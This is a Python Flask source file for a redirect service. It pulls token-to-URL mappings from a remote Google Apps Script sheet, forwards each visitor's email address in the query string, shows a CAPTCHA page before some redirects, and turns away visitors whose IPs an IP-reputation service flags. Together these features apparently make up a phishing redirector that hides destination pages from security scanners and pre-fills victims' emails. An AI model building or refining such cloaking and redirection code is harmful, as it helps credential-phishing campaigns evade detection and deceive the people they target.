from flask import Flask, request, redirect, render_template
import requests

app = Flask(__name__)


# IPHub API Key (Replace this with your actual key)
IPHUB_API_KEY = "YOUR_FREE_IPHUB_API_KEY"
# URL of the AppScript that returns the redirection data
APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbzpGDrsMrVbWe4xjt39a0AhJWPTmdqLvfSia1-gkSfNK5aTIQ95m83Q-kvIXukn_JxLXA/exec?action=getData&sheetname=REDIRECT&range=A1:E"

# Function to check if an IP is flagged
def is_ip_flagged(ip):
    try:
        headers = {"X-Key": IPHUB_API_KEY}
        response = requests.get(f"https://v2.api.iphub.info/ip/{ip}", headers=headers)
        
        if response.status_code == 200:
            data = response.json()
            return data.get("block", 0) == 1  # 1 = flagged as a bad IP
        else:
            print("Error checking IP:", response.status_code)
            return False
    except Exception as e:
        print("Exception in IP check:", str(e))
        return False  # Assume safe if API fails

# Function to fetch redirect mappings from the AppScript
def fetch_redirect_data():
    try:
        response = requests.get(APPSCRIPT_URL)
        if response.status_code == 200:
            raw_data = response.json()  # Fetch raw data
            # print("Fetched Data:", raw_data)  # Debugging

            if not isinstance(raw_data, list) or len(raw_data) < 2:
                print("Invalid data format received")
                return []

            headers = raw_data[0]  # First row is the header
            data = [dict(zip(headers, row)) for row in raw_data[1:]]  # Convert rows into dictionaries

            print("Processed Data:", data)  # Debugging
            return data
        else:
            print("Error fetching data:", response.status_code)
            return []
    except Exception as e:
        print("Exception occurred:", str(e))
        return []

# Route to handle redirection for paths '/archive<int:num>'
@app.route('/<token>')
def token_path_handler(token):
    data = fetch_redirect_data()

    # Ensure token is treated as a string and filter valid URLs
    redirect_map = {str(row['token']): row['redirectURL'] for row in data if row['redirectURL']}

    if token in redirect_map:
        redirect_url = redirect_map[token]

        # Capture email parameter and append if present
        email = request.args.get('email')
        if email:
            redirect_url = f"{redirect_url}?email={email}"

        return redirect(redirect_url)

    # Render an error template if path not found
    return render_template('error.html', message="Path not found"), 404

# Route to handle redirection for paths '/archive<int:num>'
@app.route('/archive<int:num>')
def path_handler(num):
    data = fetch_redirect_data()

    # Convert data into a dictionary { path: redirectURL }
    redirect_map = {row['path']: row['redirectURL'] for row in data if row['redirectURL']}

    path = f'archive{num}'

    if path in redirect_map:
        redirect_url = redirect_map[path]

        # Capture email parameter and append if present
        email = request.args.get('email')
        if email:
            redirect_url = f"{redirect_url}?email={email}"

        # Render CAPTCHA page before redirecting
        return render_template('captcha.html', redirect_url=redirect_url)

    # Render an error template if path not found
    return render_template('error.html', message="Path not found"), 404


# Route to handle redirection for '/directory<int:num>'
@app.route('/directory<int:num>')
def premium_path_handler(num):
    visitor_ip = request.remote_addr  # Get visitor's IP

    if is_ip_flagged(visitor_ip):
        return render_template('error.html', message="Access denied: Suspicious activity detected"), 403

    data = fetch_redirect_data()
    redirect_map = {row['path']: row['redirectURL'] for row in data if row['redirectURL']}

    path = f'directory{num}'

    if path in redirect_map:
        redirect_url = redirect_map[path]

        # Capture email parameter
        email = request.args.get('email', '')

        return render_template('redirect.html', redirect_url=redirect_url, email=email)

    return render_template('error.html', message="Path not found"), 404

# Route for the main page
@app.route('/hello')
def hello():
    return 'Hello, world'

# Route for testing
@app.route('/test')
def test():
    return 'Test'

# Route for displaying results
@app.route('/result')
def result():
    scores = {'phy': 50, 'che': 60, 'maths': 70}
    return render_template('result.html', result=scores)

if __name__ == '__main__':
    app.run(debug=True)
